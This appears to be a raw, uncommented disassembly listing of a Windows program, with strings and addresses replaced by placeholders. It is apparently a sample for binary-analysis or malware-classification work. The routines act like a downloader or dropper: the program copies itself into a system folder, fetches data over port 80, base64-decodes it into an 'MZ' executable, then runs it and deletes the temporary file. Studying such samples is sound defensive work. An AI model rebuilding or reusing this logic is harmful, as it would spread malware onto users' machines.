mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x310 ]
push 0x1
push edx
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_403924
push ebp
mov ebp esp
sub esp 0x410
push esi
push edi
mov esi rw-data
mov edi rw-data
push esi
push edi
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x30c ]
push 0x104
xor edi edi
push eax
push edi
call [ GetModuleFileNameA@IAT ]
push edi
lea eax [ ebp - 0x208 ]
push 0x26
push eax
push edi
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
push edi
call sub_4037dc
pop ecx
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x208 ]
push eax
lea eax [ ebp - 0x104 ]
push eax
call strcpy
push [ ebp + 0xc ]
lea eax [ ebp - 0x104 ]
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x208 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x1c
lea eax [ ebp - 0x30c ]
push eax
lea eax [ ebp - 0x208 ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x208 ]
push 0x1
push eax
push rw-data
push esi
call sub_40382e
push [ ebp + 0x8 ]
lea eax [ ebp - 0x410 ]
push eax
call strcpy
add esp 0x18
lea ebx [ ebp - 0x410 ]
mov edi rw-data
lea eax [ ebp - 0x208 ]
push edi
push eax
push rw-data
push esi
call sub_40382e
add esp 0x10
jmp r-xdata
lea eax [ ebp - 0x104 ]
push edi
push eax
call strcat
lea eax [ ebp - 0x104 ]
push ebx
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0x104 ]
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
test esi esi
je r-xdata
and [ esi ] 0x0
lea eax [ ebp - 0x104 ]
push edi
push eax
call strcat
push [ ebp + 0xc ]
lea eax [ ebp - 0x104 ]
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0x104 ]
push 0x0
push eax
lea eax [ ebp - 0x30c ]
push eax
call [ CopyFileA@IAT ]
pop ebx
lea ebx [ esi + 0x1 ]
jmp r-xdata
push 0x5c
push ebx
call [ strchr@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
sub_403a98
push ebp
mov ebp esp
push ecx
push ebx
push rw-data
push [ ebp + 0x8 ]
call [ fopen@IAT ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
pop ebx
leave
retn
push esi
push edi
mov esi [ fread@IAT ]
push 0x1
pop edi
lea eax [ ebp + 0xb ]
push ebx
push edi
push edi
mov [ ebp - 0x4 ] edi
push eax
push ebx
call [ fclose@IAT ]
mov eax [ ebp - 0x4 ]
pop ecx
pop edi
pop esi
movsx eax [ ebp + 0xb ]
push eax
call [ isalpha@IAT ]
test eax eax
pop ecx
jne r-xdata
push ebx
push edi
lea eax [ ebp + 0xb ]
push edi
push eax
jmp r-xdata
movsx eax [ ebp + 0xb ]
push eax
call [ isdigit@IAT ]
test eax eax
pop ecx
jne r-xdata
call esi
add esp 0x10
test eax eax
je r-xdata
mov al [ ebp + 0xb ]
cmp al 0x2b
je r-xdata
cmp al 0x2f
je r-xdata
cmp al 0x3d
je r-xdata
cmp al 0xd
je r-xdata
cmp al 0xa
jne r-xdata
and [ ebp - 0x4 ] 0x0
sub_403b25
push ebp
mov ebp esp
sub esp 0x114
and [ ebp - 0xc7 ] 0x0
push ebx
mov bl 0xff
push esi
push edi
mov [ ebp - 0x108 ] bl
mov [ ebp - 0x107 ] bl
mov [ ebp - 0x106 ] bl
mov [ ebp - 0x105 ] bl
mov [ ebp - 0x104 ] bl
mov [ ebp - 0x103 ] bl
mov [ ebp - 0x102 ] bl
mov [ ebp - 0x101 ] bl
mov [ ebp - 0x100 ] bl
mov [ ebp - 0xff ] bl
mov [ ebp - 0xfe ] bl
mov [ ebp - 0xfd ] bl
mov [ ebp - 0xfc ] bl
mov [ ebp - 0xfb ] bl
mov [ ebp - 0xfa ] bl
mov [ ebp - 0xf9 ] bl
mov [ ebp - 0xf8 ] bl
mov [ ebp - 0xf7 ] bl
mov [ ebp - 0xf6 ] bl
mov [ ebp - 0xf5 ] bl
mov [ ebp - 0xf4 ] bl
mov [ ebp - 0xf3 ] bl
mov [ ebp - 0xf2 ] bl
mov [ ebp - 0xf1 ] bl
mov [ ebp - 0xf0 ] bl
mov [ ebp - 0xef ] bl
mov [ ebp - 0xee ] bl
mov [ ebp - 0xed ] bl
mov [ ebp - 0xec ] bl
mov [ ebp - 0xeb ] bl
mov [ ebp - 0xea ] bl
mov [ ebp - 0xe9 ] bl
mov [ ebp - 0xe8 ] bl
mov [ ebp - 0xe7 ] bl
mov [ ebp - 0xe6 ] bl
mov [ ebp - 0xe5 ] bl
mov [ ebp - 0xe4 ] bl
mov [ ebp - 0xe3 ] bl
mov [ ebp - 0xe2 ] bl
mov [ ebp - 0xe1 ] bl
mov [ ebp - 0xe0 ] bl
mov [ ebp - 0xdf ] bl
mov [ ebp - 0xde ] bl
mov [ ebp - 0xdd ] 0x3e
mov [ ebp - 0xdc ] bl
mov [ ebp - 0xdb ] bl
mov [ ebp - 0xda ] bl
mov [ ebp - 0xd9 ] 0x3f
mov [ ebp - 0xd8 ] 0x34
mov [ ebp - 0xd7 ] 0x35
mov [ ebp - 0xd6 ] 0x36
mov [ ebp - 0xd5 ] 0x37
mov [ ebp - 0xd4 ] 0x38
mov [ ebp - 0xd3 ] 0x39
mov [ ebp - 0xd2 ] 0x3a
mov [ ebp - 0xd1 ] 0x3b
mov [ ebp - 0xd0 ] 0x3c
mov [ ebp - 0xcf ] 0x3d
mov [ ebp - 0xce ] bl
mov [ ebp - 0xcd ] bl
mov [ ebp - 0xcc ] bl
mov [ ebp - 0xcb ] bl
mov [ ebp - 0xca ] bl
mov [ ebp - 0xc9 ] bl
mov [ ebp - 0xc8 ] bl
mov [ ebp - 0xc6 ] 0x1
mov [ ebp - 0xc5 ] 0x2
mov [ ebp - 0xc4 ] 0x3
mov [ ebp - 0xc3 ] 0x4
mov [ ebp - 0xc2 ] 0x5
mov [ ebp - 0xc1 ] 0x6
mov [ ebp - 0xc0 ] 0x7
mov [ ebp - 0xbf ] 0x8
mov [ ebp - 0xbe ] 0x9
mov [ ebp - 0xbd ] 0xa
mov [ ebp - 0xbc ] 0xb
mov [ ebp - 0xbb ] 0xc
mov [ ebp - 0xba ] 0xd
mov [ ebp - 0xb9 ] 0xe
mov [ ebp - 0xb8 ] 0xf
mov [ ebp - 0xb7 ] 0x10
mov [ ebp - 0xb6 ] 0x11
mov [ ebp - 0xb5 ] 0x12
mov [ ebp - 0xb4 ] 0x13
mov [ ebp - 0xb3 ] 0x14
mov [ ebp - 0xb2 ] 0x15
mov [ ebp - 0xb1 ] 0x16
mov [ ebp - 0xb0 ] 0x17
mov [ ebp - 0xaf ] 0x18
mov [ ebp - 0xae ] 0x19
mov [ ebp - 0xad ] bl
mov [ ebp - 0xac ] bl
mov [ ebp - 0xab ] bl
mov [ ebp - 0xaa ] bl
mov [ ebp - 0xa9 ] bl
mov [ ebp - 0xa8 ] bl
mov [ ebp - 0xa7 ] 0x1a
mov [ ebp - 0xa6 ] 0x1b
mov [ ebp - 0xa5 ] 0x1c
mov [ ebp - 0xa4 ] 0x1d
mov [ ebp - 0xa3 ] 0x1e
mov [ ebp - 0xa2 ] 0x1f
mov [ ebp - 0xa1 ] 0x20
mov [ ebp - 0xa0 ] 0x21
mov [ ebp - 0x9f ] 0x22
mov [ ebp - 0x9e ] 0x23
mov [ ebp - 0x9d ] 0x24
mov [ ebp - 0x9c ] 0x25
mov [ ebp - 0x9b ] 0x26
mov [ ebp - 0x9a ] 0x27
mov [ ebp - 0x99 ] 0x28
mov [ ebp - 0x98 ] 0x29
mov [ ebp - 0x97 ] 0x2a
mov [ ebp - 0x96 ] 0x2b
mov [ ebp - 0x95 ] 0x2c
mov [ ebp - 0x94 ] 0x2d
mov [ ebp - 0x93 ] 0x2e
mov [ ebp - 0x92 ] 0x2f
mov [ ebp - 0x91 ] 0x30
mov [ ebp - 0x90 ] 0x31
mov [ ebp - 0x8f ] 0x32
mov [ ebp - 0x8e ] 0x33
mov [ ebp - 0x8d ] bl
mov [ ebp - 0x8c ] bl
mov [ ebp - 0x8b ] bl
mov [ ebp - 0x8a ] bl
mov [ ebp - 0x89 ] bl
mov [ ebp - 0x88 ] bl
mov [ ebp - 0x87 ] bl
mov [ ebp - 0x86 ] bl
mov [ ebp - 0x85 ] bl
mov [ ebp - 0x84 ] bl
mov [ ebp - 0x83 ] bl
mov [ ebp - 0x82 ] bl
mov [ ebp - 0x81 ] bl
mov [ ebp - 0x80 ] bl
mov [ ebp - 0x7f ] bl
mov [ ebp - 0x7e ] bl
mov [ ebp - 0x7d ] bl
mov [ ebp - 0x7c ] bl
mov [ ebp - 0x7b ] bl
mov [ ebp - 0x7a ] bl
mov [ ebp - 0x79 ] bl
mov [ ebp - 0x78 ] bl
mov [ ebp - 0x77 ] bl
mov [ ebp - 0x76 ] bl
mov [ ebp - 0x75 ] bl
mov [ ebp - 0x74 ] bl
mov [ ebp - 0x73 ] bl
mov [ ebp - 0x72 ] bl
mov [ ebp - 0x71 ] bl
mov [ ebp - 0x70 ] bl
mov [ ebp - 0x6f ] bl
mov [ ebp - 0x6e ] bl
mov [ ebp - 0x6d ] bl
mov [ ebp - 0x6c ] bl
mov [ ebp - 0x6b ] bl
mov [ ebp - 0x6a ] bl
mov [ ebp - 0x69 ] bl
mov [ ebp - 0x68 ] bl
mov [ ebp - 0x67 ] bl
mov [ ebp - 0x66 ] bl
mov [ ebp - 0x65 ] bl
mov [ ebp - 0x64 ] bl
mov [ ebp - 0x63 ] bl
mov [ ebp - 0x62 ] bl
mov [ ebp - 0x61 ] bl
mov [ ebp - 0x60 ] bl
mov [ ebp - 0x5f ] bl
mov [ ebp - 0x5e ] bl
mov [ ebp - 0x5d ] bl
mov [ ebp - 0x5c ] bl
mov [ ebp - 0x5b ] bl
mov [ ebp - 0x5a ] bl
mov [ ebp - 0x59 ] bl
mov [ ebp - 0x58 ] bl
mov [ ebp - 0x57 ] bl
mov [ ebp - 0x56 ] bl
mov [ ebp - 0x55 ] bl
mov [ ebp - 0x54 ] bl
mov [ ebp - 0x53 ] bl
mov [ ebp - 0x52 ] bl
mov [ ebp - 0x51 ] bl
mov [ ebp - 0x50 ] bl
mov [ ebp - 0x4f ] bl
mov [ ebp - 0x4e ] bl
mov [ ebp - 0x4d ] bl
mov [ ebp - 0x4c ] bl
mov [ ebp - 0x4b ] bl
mov [ ebp - 0x4a ] bl
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x48 ] bl
mov [ ebp - 0x47 ] bl
mov [ ebp - 0x46 ] bl
mov [ ebp - 0x45 ] bl
mov [ ebp - 0x44 ] bl
mov [ ebp - 0x43 ] bl
mov [ ebp - 0x42 ] bl
mov [ ebp - 0x41 ] bl
mov [ ebp - 0x40 ] bl
mov [ ebp - 0x3f ] bl
mov [ ebp - 0x3e ] bl
mov [ ebp - 0x3d ] bl
mov [ ebp - 0x3c ] bl
mov [ ebp - 0x3b ] bl
mov [ ebp - 0x3a ] bl
mov [ ebp - 0x39 ] bl
mov [ ebp - 0x38 ] bl
mov [ ebp - 0x37 ] bl
mov [ ebp - 0x36 ] bl
mov [ ebp - 0x35 ] bl
mov [ ebp - 0x34 ] bl
mov [ ebp - 0x33 ] bl
mov [ ebp - 0x32 ] bl
mov [ ebp - 0x31 ] bl
mov [ ebp - 0x30 ] bl
mov [ ebp - 0x2f ] bl
mov [ ebp - 0x2e ] bl
mov [ ebp - 0x2d ] bl
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x2b ] bl
mov [ ebp - 0x2a ] bl
mov [ ebp - 0x29 ] bl
mov [ ebp - 0x28 ] bl
mov [ ebp - 0x27 ] bl
mov [ ebp - 0x26 ] bl
mov [ ebp - 0x25 ] bl
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x23 ] bl
mov [ ebp - 0x22 ] bl
mov [ ebp - 0x21 ] bl
mov [ ebp - 0x20 ] bl
mov [ ebp - 0x1f ] bl
mov [ ebp - 0x1e ] bl
mov [ ebp - 0x1d ] bl
mov [ ebp - 0x1c ] bl
mov [ ebp - 0x1b ] bl
mov [ ebp - 0x1a ] bl
mov esi [ fopen@IAT ]
push rw-data
push [ ebp + 0x8 ]
mov [ ebp - 0x19 ] bl
mov [ ebp - 0x18 ] bl
mov [ ebp - 0x17 ] bl
mov [ ebp - 0x16 ] bl
mov [ ebp - 0x15 ] bl
mov [ ebp - 0x14 ] bl
mov [ ebp - 0x13 ] bl
mov [ ebp - 0x12 ] bl
mov [ ebp - 0x11 ] bl
mov [ ebp - 0x10 ] bl
mov [ ebp - 0xf ] bl
mov [ ebp - 0xe ] bl
mov [ ebp - 0xd ] bl
mov [ ebp - 0xc ] bl
mov [ ebp - 0xb ] bl
mov [ ebp - 0xa ] bl
mov [ ebp - 0x9 ] bl
call esi
push rw-data
mov edi eax
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] edi
call esi
add esp 0x10
mov [ ebp - 0x114 ] eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x110 ] 0x0
and [ ebp - 0x10c ] 0x0
mov esi [ fread@IAT ]
push edi
push 0x1
lea eax [ ebp + 0xb ]
pop edi
push edi
push edi
push eax
push edi
call [ fclose@IAT ]
pop ecx
movzx eax [ ebp + 0xb ]
mov al [ ebp + eax - 0x108 ]
mov [ ebp + 0xf ] al
movzx eax [ ebp + 0xb ]
cmp [ ebp + eax - 0x108 ] bl
jne r-xdata
push [ ebp - 0x8 ]
mov esi [ fclose@IAT ]
call esi
push [ ebp - 0x114 ]
call esi
pop ecx
mov eax edi
pop ecx
movzx eax [ ebp + 0xb ]
mov cl [ ebp + eax - 0x108 ]
cmp cl bl
je r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp + 0xb ]
push edi
push edi
push eax
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp + 0xb ]
push edi
push edi
push eax
call esi
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp - 0x110 ]
push 0x3
xor edx edx
pop edi
div edi
test edx edx
jne r-xdata
call esi
add esp 0x10
test eax eax
je r-xdata
push 0x1
pop edi
cmp edx edi
jne r-xdata
cmp [ ebp - 0x10c ] edx
je r-xdata
cmp edx 0x2
jne r-xdata
mov al [ ebp + 0xf ]
shr cl 0x2
shl al 0x4
or cl al
mov [ ebp - 0x1 ] cl
jmp r-xdata
mov al [ ebp + 0xf ]
push 0x1
shr cl 0x4
shl al 0x2
or cl al
pop edi
mov [ ebp - 0x1 ] cl
jmp r-xdata
and [ ebp - 0x10c ] edx
push 0x1
mov [ ebp + 0xf ] cl
pop edi
jmp r-xdata
push [ ebp - 0x114 ]
lea eax [ ebp - 0x1 ]
push edi
push edi
push eax
call [ fwrite@IAT ]
movzx eax [ ebp + 0xb ]
add esp 0x10
inc [ ebp - 0x110 ]
mov al [ ebp + eax - 0x108 ]
mov [ ebp + 0xf ] al
jmp r-xdata
mov al [ ebp + 0xf ]
mov [ ebp - 0x10c ] edi
shl al 0x6
or al cl
mov [ ebp - 0x1 ] al
sub_40416d
push ebp
mov ebp esp
push esi
push rw-data
push [ ebp + 0x8 ]
call [ fopen@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
xor eax eax
push esi
push 0x2
lea eax [ ebp + 0xa ]
push 0x1
push eax
call [ fread@IAT ]
push esi
call [ fclose@IAT ]
add esp 0x14
cmp [ ebp + 0xa ] 0x5a4d
jne r-xdata
push 0x1
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_4041b2
push ebp
mov ebp esp
sub esp 0x8c
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov edi eax
xor esi esi
cmp edi esi
pop ecx
jne r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
push edi
push esi
push rw-data
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] esi
push 0x50
push rw-data
call sub_40172c
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push edi
call [ free@IAT ]
pop ecx
mov eax esi
mov eax [ ebp - 0x4 ]
push ebx
and [ eax + edi ] 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8c ]
push eax
mov [ ebp - 0xc ] 0x80
call [ GetComputerNameA@IAT ]
lea esi [ edi - 0x2 ]
pop edi
pop esi
leave
retn
mov esi [ ebp - 0x8 ]
pop ebx
test esi esi
je r-xdata
lea ebx [ esi + 0x2 ]
push 0xd
push ebx
call [ strchr@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
lea eax [ ebp - 0x8c ]
push eax
push ebx
call strcmp
pop ecx
test eax eax
pop ecx
jne r-xdata
and [ esi ] 0x0
mov eax [ ebp - 0x4 ]
add eax edi
cmp esi eax
jae r-xdata
mov [ ebp - 0x8 ] 0x1
sub_404270
push ebp
mov ebp esp
sub esp 0x214
push ebx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov edi eax
xor esi esi
cmp edi esi
pop ecx
mov [ ebp - 0x4 ] edi
je r-xdata
xor eax eax
lea eax [ ebp - 0x8 ]
push esi
push eax
push edi
push esi
push rw-data
push [ ebp + 0x8 ]
push 0x50
push rw-data
call sub_40172c
add esp 0x20
test eax eax
jne r-xdata
mov edi [ SHGetSpecialFolderPathA@IAT ]
push esi
lea eax [ ebp - 0x214 ]
push 0x26
push eax
push esi
call edi
push [ ebp + 0xc ]
mov ebx [ sprintf@IAT ]
lea eax [ ebp - 0x214 ]
push rw-data
push eax
lea eax [ ebp - 0x214 ]
push rw-data
push eax
call ebx
add esp 0x14
lea eax [ ebp - 0x110 ]
push esi
push 0x26
push eax
push esi
call edi
push rw-data
lea eax [ ebp - 0x110 ]
push rw-data
push eax
lea eax [ ebp - 0x110 ]
push rw-data
push eax
call ebx
add esp 0x14
lea eax [ ebp - 0x110 ]
push esi
push 0x20
push 0x2
push esi
push esi
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push edi
jmp r-xdata
lea eax [ ebp - 0xc ]
push esi
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push edi
call [ WriteFile@IAT ]
push edi
mov ebx eax
call [ CloseHandle@IAT ]
push [ ebp - 0x4 ]
call [ free@IAT ]
cmp ebx esi
pop ecx
je r-xdata
push [ ebp - 0x4 ]
call [ free@IAT ]
pop ecx
lea eax [ ebp - 0x110 ]
push eax
call sub_403a98
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x214 ]
push esi
push eax
lea eax [ ebp - 0x110 ]
push eax
call [ CopyFileA@IAT ]
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x110 ]
push eax
call sub_403b25
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x214 ]
push eax
call sub_40310a
pop ecx
push 0x1
pop eax
jmp r-xdata
lea eax [ ebp - 0x110 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x214 ]
push eax
call sub_40416d
test eax eax
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_4043f5
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x3e800
xor edi edi
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x4 ]
push 0x0
push eax
push esi
push 0x0
push rw-data
push [ ebp + 0x8 ]
push 0x50
push rw-data
call sub_40172c
add esp 0x20
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
push rw-data
push esi
and [ eax + esi ] 0x0
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
xor edi edi
jmp r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax edi
push 0x1
pop edi
sub_404460
cmp [ rw-data ] 0x0
push esi
mov esi [ free@IAT ]
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
call esi
pop ecx
call [ Ordinal_WSOCK32_116@IAT ]
push 0x1
call [ exit@IAT ]
push 0x0
call esi
pop ecx
sub_4044d0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_404685
cmp [ rw-data ] ebx
jne r-xdata
call sub_404670
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_404682
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401063
mov eax r-xdata
retn
sub_40142d
sub esp 0x190
lea eax [ esp ]
push eax
push 0x2
call [ Ordinal_WSOCK32_115@IAT ]
neg eax
sbb eax eax
inc eax
add esp 0x190
retn
sub_401de0
push rw-data
call sub_4043f5
test eax eax
pop ecx
jne r-xdata
push rw-data
push rw-data
call sub_404270
pop ecx
pop ecx
retn
retn
sub_401e35
push rw-data
push rw-data
call sub_404270
pop ecx
pop ecx
retn
sub_401e47
push rw-data
call sub_4041b2
test eax eax
pop ecx
jne r-xdata
push rw-data
push rw-data
call sub_404270
pop ecx
pop ecx
retn
retn
sub_4022fe
xor ecx ecx
cmp [ esp + 0x8 ] ecx
jle r-xdata
retn
mov eax [ esp + 0x4 ]
or dl 0xff
add eax ecx
sub dl cl
add [ eax ] dl
inc ecx
cmp ecx [ esp + 0x8 ]
jl r-xdata
sub_40238e
push [ esp + 0x4 ]
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ Ordinal_WSOCK32_11@IAT ]
retn
sub_4026d2
mov eax [ rw-data ]
lea ecx [ eax + 0x4 ]
push ecx
push [ eax ]
call sub_40254e
pop ecx
pop ecx
retn
sub_402c46
push [ rw-data ]
call sub_40310a
neg eax
sbb al al
pop ecx
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_402f6f
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_EH_prolog
jmp [ _EH_prolog@IAT ]
strcpy
jmp [ strcpy@IAT ]
strlen
jmp [ strlen@IAT ]
strcat
jmp [ strcat@IAT ]
memset
jmp [ memset@IAT ]
memcpy
jmp [ memcpy@IAT ]
strcmp
jmp [ strcmp@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_404670
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_404682
xor eax eax
retn
sub_404685
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_4046a0
mov eax r--data
jmp __CxxFrameHandler
